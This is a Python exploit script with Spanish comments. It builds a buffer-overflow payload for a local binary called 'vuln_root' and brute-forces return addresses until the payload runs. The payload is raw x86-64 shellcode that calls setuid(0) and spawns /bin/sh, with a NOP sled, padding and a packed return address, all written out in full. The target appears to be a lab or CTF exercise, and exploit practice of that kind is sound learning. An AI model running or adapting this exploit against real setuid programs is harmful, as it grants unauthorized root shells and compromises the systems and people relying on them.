import struct
import os

shellcode = (
    # setuid(0)
    b"\x48\x31\xff"      # xor rdi, rdi
    b"\x48\x31\xc0"      # xor rax, rax
    b"\xb0\x17"          # mov al, 0x17
    b"\x0f\x05"          # syscall
    
    b"\x48\x31\xc9\x48\xf7\xe1\x04\x3b\x48\xbb"
    b"\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53"
    b"\x54\x5f\x52\x57\x54\x5e\x0f\x05"
)

nop_sled = b"\x90" * 16  # NOP sled de 16 bytes
padding = b"A" * (88 - len(nop_sled) - len(shellcode))

# Rango de direcciones (cambian de un sistema a otro)
start_addr = 0x7fffffffd900
end_addr =   0x7fffffffda00
step = 8                  # Prueba cada 8 bytes

print(f"Probando direcciones desde {hex(start_addr)} hasta {hex(end_addr)}")

for address in range(start_addr, end_addr, step):
    print(f"\n=== Probando direcci√≥n: {hex(address)} ===")
    
    # Construye payload
    ret_addr = struct.pack("<Q", address)
    payload = nop_sled + shellcode + padding + ret_addr
    
    # Guarda payload
    with open("payload.bin", "wb") as f:
        f.write(payload)

    os.system("./vuln_root $(cat payload.bin)")

print("Prueba completada.")
